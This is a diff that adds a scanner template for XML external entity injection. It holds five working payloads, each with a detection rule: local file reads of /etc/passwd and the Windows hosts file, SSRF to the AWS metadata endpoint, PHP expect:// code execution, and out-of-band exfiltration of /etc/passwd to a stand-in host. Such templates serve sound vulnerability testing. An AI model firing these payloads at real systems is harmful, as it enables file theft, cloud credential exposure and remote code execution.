@@ -1,0 +1,41 @@
+id: xxe-entity
+name: XML external entity injection
+context:
+  content_type: ["application/xml", "text/xml"]
+  technologies: ["SOAP", "XML-RPC"]
+
+payloads:
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    detect: { body_regex: "root:.*:0:0" }
+    id: xxe-passwd-01
+    title: "XXE — local file read (/etc/passwd)"
+    severity: critical
+    cwe: CWE-611
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\">]><foo>&xxe;</foo>"
+    detect: { body_contains: "localhost" }
+    id: xxe-win-01
+    title: "XXE — local file read (Windows hosts)"
+    severity: critical
+    cwe: CWE-611
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+    detect: { body_contains: "ami-id" }
+    id: xxe-ssrf-01
+    title: "XXE — SSRF to AWS metadata via XML entity"
+    severity: critical
+    cwe: CWE-611
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>"
+    detect: { body_regex: "uid=" }
+    id: xxe-expect-01
+    title: "XXE — PHP expect:// wrapper RCE"
+    severity: critical
+    cwe: CWE-611
+
+  - value: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://cyweb.test/?d=%xxe;'>\">%eval;%exfil;]>"
+    detect: { status_change: true }
+    id: xxe-oob-01
+    title: "XXE — out-of-band parameter entity exfiltration"
+    severity: critical
+    cwe: CWE-611
